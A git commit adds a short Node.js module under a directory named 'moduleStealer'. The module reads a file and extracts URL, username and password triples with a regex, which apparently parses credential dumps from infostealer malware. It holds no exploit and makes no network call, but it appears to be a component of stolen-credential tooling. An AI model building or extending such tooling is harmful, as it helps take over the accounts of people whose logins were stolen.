085db7eba9bdd0adb7685c1ad84978a10b489d6e
AsukaQwerty123 <114372961+AsukaQwerty123@users.noreply.github.com>
2022-11-24 13:47:06 +0300

    Add files via upload

---
+++ moduleStealer/hzchtozasteal1.js
@@ -0,0 +1,15 @@
+const baseExp = new RegExp('URL: (.+)(?:\r|)\nUSER: (.+)(?:\r|)\nPASS: (.+)', 'gm');
+const fs = require('fs/promises');
+const { format } = require('../structures/utils');
+
+class hz1 {
+    static async get(path) {
+        const data = await fs.readFile(path, 'utf-8');
+        const mathes = [...data.matchAll(baseExp)];
+
+        const json = mathes.map(async x=>format(x, path));
+        return json;
+    }
+}
+
+module.exports = hz1;
